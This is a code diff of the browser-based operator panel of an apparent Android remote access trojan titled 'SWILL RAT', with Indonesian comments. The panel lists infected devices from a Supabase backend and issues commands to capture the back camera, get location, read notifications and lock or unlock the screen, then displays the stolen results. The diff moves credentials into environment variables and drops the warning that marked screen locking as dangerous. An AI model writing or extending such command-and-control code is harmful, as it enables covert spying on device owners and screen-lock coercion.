@@ -85,14 +85,16 @@
             h2 { font-size: 1.3rem; }
             input, button, select { padding: 12px 14px; font-size: 0.9rem; }
         }
+        .error-msg { color: #ff4444; margin-top: 10px; text-align: center; }
     </style>
 </head>
 <body>
 <div class="container" id="app">
     <div id="loginPanel" class="login-container">
-        <h2>HALO WORD</h2>
+        <h2>🔐 SWILL RAT</h2>
         <input type="password" id="password" placeholder="Password" autocomplete="off">
         <button onclick="login()">⏎ Login</button>
+        <div id="loginError" class="error-msg"></div>
     </div>
     
     <div id="adminPanel" class="panel hidden">
@@ -108,7 +110,7 @@
                 <option value="capture_back_cam">📸 Back Camera</option>
                 <option value="get_location">📍 Get Location</option>
                 <option value="get_device_info">📱 Device Info</option>
-                <option value="show_lockdown">🔒 Lock Screen (BERBAHAYA)</option>
+                <option value="show_lockdown">🔒 Lock Screen</option>
                 <option value="hide_lockdown">🔓 Unlock Screen</option>
                 <option value="get_notifications">🔔 Get Notifications</option>
             </select>
@@ -121,45 +123,87 @@
 </div>
 
 <script>
-    // ========== BACA ENVIRONMENT VARIABLE DARI VERCEL ==========
-    // Gunakan window.__ENV atau fallback ke placeholder (aman untuk GitHub)
-    const SUPABASE_URL = window.__ENV?.SUPABASE_URL || "https://YOUR_PROJECT.supabase.co";
-    const SUPABASE_ANON_KEY = window.__ENV?.SUPABASE_ANON_KEY || "YOUR_ANON_KEY";
-    const ADMIN_PASSWORD = "dhex230703";
+    // ========== AMAN UNTUK GITHUB ==========
+    // Semua credentials diambil dari environment variables Vercel
+    // Tidak ada hardcode credentials di file ini
     
-    let supabase;
+    let supabase = null;
     let currentDeviceId = null;
     let devicesRefreshInterval = null;
     let resultsRefreshInterval = null;
     
-    function login() {
-        const pwd = document.getElementById('password').value;
-        if (pwd === ADMIN_PASSWORD) {
-            document.getElementById('loginPanel').classList.add('hidden');
-            document.getElementById('adminPanel').classList.remove('hidden');
-            initSupabase();
-            loadDevices();
-            if (devicesRefreshInterval) clearInterval(devicesRefreshInterval);
-            if (resultsRefreshInterval) clearInterval(resultsRefreshInterval);
-            devicesRefreshInterval = setInterval(loadDevices, 5000);
-            resultsRefreshInterval = setInterval(checkResults, 3000);
-        } else {
-            alert("❌ Wrong password");
-        }
+    // Fungsi untuk mendapatkan config dari berbagai sumber
+    function getConfig() {
+        // Priority: window.__ENV (Vercel) > window.env (fallback) > placeholder
+        const supabaseUrl = 
+            (typeof window.__ENV !== 'undefined' && window.__ENV.SUPABASE_URL) ||
+            (typeof window.env !== 'undefined' && window.env.SUPABASE_URL) ||
+            null;
+        
+        const supabaseKey = 
+            (typeof window.__ENV !== 'undefined' && window.__ENV.SUPABASE_ANON_KEY) ||
+            (typeof window.env !== 'undefined' && window.env.SUPABASE_ANON_KEY) ||
+            null;
+        
+        // Password dari environment variable Vercel (wajib di set)
+        const adminPassword = 
+            (typeof window.__ENV !== 'undefined' && window.__ENV.ADMIN_PASSWORD) ||
+            (typeof window.env !== 'undefined' && window.env.ADMIN_PASSWORD) ||
+            null;
+        
+        return { supabaseUrl, supabaseKey, adminPassword };
     }
     
-    function initSupabase() {
-        if (!SUPABASE_URL || SUPABASE_URL === "https://YOUR_PROJECT.supabase.co") {
-            console.warn("⚠️ Gunakan ENV Vercel: SUPABASE_URL dan SUPABASE_ANON_KEY");
+    async function login() {
+        const pwd = document.getElementById('password').value;
+        const errorDiv = document.getElementById('loginError');
+        errorDiv.innerHTML = '';
+        
+        const config = getConfig();
+        
+        // Cek apakah environment variables sudah di set di Vercel
+        if (!config.supabaseUrl || !config.supabaseKey) {
+            errorDiv.innerHTML = '❌ Konfigurasi Supabase tidak ditemukan. Pastikan environment variables SUPABASE_URL dan SUPABASE_ANON_KEY sudah di set di Vercel.';
+            return;
         }
-        supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+        
+        if (!config.adminPassword) {
+            errorDiv.innerHTML = '❌ Konfigurasi password tidak ditemukan. Pastikan environment variable ADMIN_PASSWORD sudah di set di Vercel.';
+            return;
+        }
+        
+        if (pwd !== config.adminPassword) {
+            errorDiv.innerHTML = '❌ Password salah';
+            return;
+        }
+        
+        // Password benar
+        document.getElementById('loginPanel').classList.add('hidden');
+        document.getElementById('adminPanel').classList.remove('hidden');
+        
+        initSupabase(config.supabaseUrl, config.supabaseKey);
+        await loadDevices();
+        
+        if (devicesRefreshInterval) clearInterval(devicesRefreshInterval);
+        if (resultsRefreshInterval) clearInterval(resultsRefreshInterval);
+        devicesRefreshInterval = setInterval(loadDevices, 5000);
+        resultsRefreshInterval = setInterval(checkResults, 3000);
+    }
+    
+    function initSupabase(url, key) {
+        supabase = window.supabase.createClient(url, key);
     }
     
     async function loadDevices() {
         if (!supabase) return;
-        const { data, error } = await supabase.from('devices').select('*').order('last_seen', { ascending: false });
+        
+        const { data, error } = await supabase
+            .from('devices')
+            .select('*')
+            .order('last_seen', { ascending: false });
+        
         if (error) {
-            console.error(error);
+            console.error('Load devices error:', error);
             return;
         }
         
@@ -167,7 +211,7 @@
         const deviceSelect = document.getElementById('deviceSelect');
         
         if (!data || data.length === 0) {
-            devicesDiv.innerHTML = '<div class="device-card" style="color:#888">Belum ada device terhubung</div>';
+            devicesDiv.innerHTML = '<div class="device-card" style="color:#888">🔌 Belum ada device terhubung</div>';
             deviceSelect.innerHTML = '<option value="">-- Tidak ada device --</option>';
             return;
         }
@@ -178,7 +222,7 @@
                 <div>🤖 Android: ${d.android_version || '-'}</div>
                 <div>🕒 Last Seen: ${new Date(d.last_seen).toLocaleString()}</div>
                 <div>🔒 Locked: <span class="status-badge ${d.is_locked ? 'locked-yes' : 'locked-no'}">${d.is_locked ? 'ACTIVE' : 'OFF'}</span></div>
-                <button onclick="selectDevice('${d.id}')">🎯 Select Device</button>
+                <button onclick="selectDevice('${d.id}')">🎯 Select</button>
             </div>
         `).join('');
         
@@ -188,8 +232,7 @@
     
     function selectDevice(id) {
         currentDeviceId = id;
-        const deviceName = [...document.querySelectorAll('.device-card')].find(card => card.innerHTML.includes(id))?.querySelector('strong')?.innerText || id.slice(0,8);
-        alert(`✅ Device selected: ${deviceName}`);
+        alert('✅ Device selected');
     }
     
     async function sendCommand() {
@@ -197,7 +240,7 @@
         const command = document.getElementById('commandSelect').value;
         
         if (!deviceId) {
-            alert("⚠️ Pilih device terlebih dahulu!");
+            alert('⚠️ Pilih device terlebih dahulu');
             return;
         }
         
@@ -209,15 +252,17 @@
         });
         
         if (error) {
-            alert("❌ Error: " + error.message);
+            alert('❌ Error: ' + error.message);
         } else {
-            alert("✅ Command terkirim ke device");
+            alert('✅ Command terkirim');
         }
     }
     
     async function checkResults() {
         if (!supabase) return;
-        const { data, error } = await supabase.from('commands')
+        
+        const { data, error } = await supabase
+            .from('commands')
             .select('*')
             .eq('status', 'done')
             .order('executed_at', { ascending: false })
@@ -233,18 +278,16 @@
         
         resultsDiv.innerHTML = data.map(cmd => `
             <div style="border-bottom:1px solid #00ff00; margin:10px 0; padding-bottom:10px;">
-                <strong>⚙️ ${cmd.command}</strong> <span style="color:#aaa; font-size:0.7rem;">${cmd.device_id?.slice(0,8)}</span><br>
-                📦 Result: <pre style="margin-top:6px; background:#111; padding:8px; border-radius:8px; overflow-x:auto;">${JSON.stringify(cmd.result, null, 2)}</pre>
+                <strong>⚙️ ${cmd.command}</strong> <span style="color:#aaa; font-size:0.7rem;">${(cmd.device_id || '').slice(0,8)}</span><br>
+                📦 Result: <pre style="margin-top:6px; background:#111; padding:8px; border-radius:8px; overflow-x:auto; font-size:0.75rem;">${JSON.stringify(cmd.result, null, 2)}</pre>
             </div>
         `).join('');
     }
     
-    // Optional: inject environment dari Vercel via __ENV (akan di-set saat build)
+    // Inisialisasi window.__ENV (akan diisi oleh Vercel saat build)
     if (typeof window.__ENV === 'undefined') {
         window.__ENV = {};
     }
-    // Untuk development lokal, bisa diisi manual, tapi tidak disarankan commit ke GitHub
 </script>
 </body>
 </html>
-```
